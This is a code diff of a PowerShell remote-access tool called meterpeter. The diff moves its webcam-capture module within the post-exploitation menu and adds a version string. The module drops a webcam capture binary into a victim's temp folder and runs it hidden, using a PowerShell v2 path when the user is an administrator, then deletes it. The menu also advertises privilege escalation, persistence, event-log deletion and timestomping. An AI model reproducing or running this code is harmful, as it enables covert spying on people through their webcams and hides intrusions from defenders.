@@ -31,6 +31,8 @@
 #>
 
 
+## Meterpeter Develop version
+$dev_Version = "2.10.2";
 
 function Character_Obfuscation($String)
 {
@@ -382,13 +384,13 @@ While($Client.Connected)
     }
 
     ## venom v1.0.16 function
-    If($Command -eq "-v" -or $Command -eq "version")
+    If($Command -eq "-v" -or $Command -eq "--version" -or $Command -eq "version")
     {
       $Parse = "$IPATH"+"meterpeter.ps1"
       $SerSat = "$Local_Host"+":"+"$Local_Port";
       write-host "`n`n Current Settings" -ForegroundColor green;
       write-host " ----------------";
-      write-host " meterpeter version   : 2.10.1";
+      write-host " meterpeter version   : v${dev_Version}";
       write-host " Attacker Arch        : $env:PROCESSOR_ARCHITECTURE";
       write-host " Attacker flavor      : $Flavor Distro";
       write-host " Attacker Settings    : $SerSat";
@@ -818,8 +820,8 @@ While($Client.Connected)
       write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
       write-host "   -------   -----------                     ------";
       write-host "   Escalate  Escalate Privileges             Client UserLand to NT/SYSTEM";
-      write-host "   CamSnap   WebCam Screenshot               Take a screenshot using webcam";
       write-host "   Persist   Remote Persist Client           Execute Client on every startup";
+      write-host "   CamSnap   Remote WebCam Screenshot        Take a screenshot using webcam";
       write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
       write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
       write-host "   SetMace   Change files date/time          Change Remote-Host Files TimeStomp";
@@ -881,71 +883,6 @@ While($Client.Connected)
           $Escal_choise = $Null;
           $trigger_File = $Null;
           $Input_Delay = $Null;
-        }
-      }
-      If($choise -eq "CamSnap" -or $choise -eq "cam")
-      {
-        write-host "`n   Remark" -ForegroundColor Yellow;
-        write-host "   ------";
-        write-host "   Executing this module in UserLand (privileges) will";
-        write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Device    List WebCam Devices             Client:User  -  Privileges required";
-        write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
-        $Cam_choise = Read-Host;
-        If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
-        {
-          $name = "CommandCam.exe";
-          $File = "$Bin$name"
-          If(([System.IO.File]::Exists("$File")))
-          {
-            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
-            $FileBytes = "($FileBytes)";
-            $File = $File.Split('\')[-1];
-            $File = $File.Split('/')[-1];
-            #$Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
-            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";
-            $Command = $Command -replace "#","$File";
-            $Command = $Command -replace "@","$FileBytes";
-            $Camflop = "True";
-            $Upload = $True;
-          } Else {
-            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-            Write-Host "   ------   ---------";
-            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
-            $Command = $Null;
-          }
-        }
-        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
-        {
-          $name = "CommandCam.exe";
-          $File = "$Bin$name"
-          If(([System.IO.File]::Exists("$File")))
-          {
-            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
-            $FileBytes = "($FileBytes)";
-            $File = $File.Split('\')[-1];
-            $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
-            $Command = $Command -replace "#","$File";
-            $Command = $Command -replace "@","$FileBytes";
-            $Upload = $True;
-            $Cam_set = "True";
-          } Else {
-            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-            Write-Host "   ------   ---------";
-            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
-            $Command = $Null;
-          }
-        }
-        If($Cam_choise -eq "Return" -or $Cam_choise -eq "return" -or $Cam_choise -eq "cls" -or $Cam_choise -eq "Modules" -or $Cam_choise -eq "modules" -or $Cam_choise -eq "clear")
-        {
-          $choise = $Null;
-          $Command = $Null;
-          $Cam_choise = $Null;
         }
       }
       If($choise -eq "Persist" -or $choise -eq "persistance")
@@ -1030,6 +967,71 @@ While($Client.Connected)
           $choise = $Null;
           $Command = $Null;
           $startup_choise = $Null;
+        }
+      }
+      If($choise -eq "CamSnap" -or $choise -eq "cam")
+      {
+        write-host "`n   Remark" -ForegroundColor Yellow;
+        write-host "   ------";
+        write-host "   Executing this module in UserLand (privileges) will";
+        write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Device    List WebCam Devices             Client:User  -  Privileges required";
+        write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
+        $Cam_choise = Read-Host;
+        If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            #$Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Camflop = "True";
+            $Upload = $True;
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+            $Cam_set = "True";
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Return" -or $Cam_choise -eq "return" -or $Cam_choise -eq "cls" -or $Cam_choise -eq "Modules" -or $Cam_choise -eq "modules" -or $Cam_choise -eq "clear")
+        {
+          $choise = $Null;
+          $Command = $Null;
+          $Cam_choise = $Null;
         }
       }
       If($choise -eq "Restart" -or $choise -eq "restart")
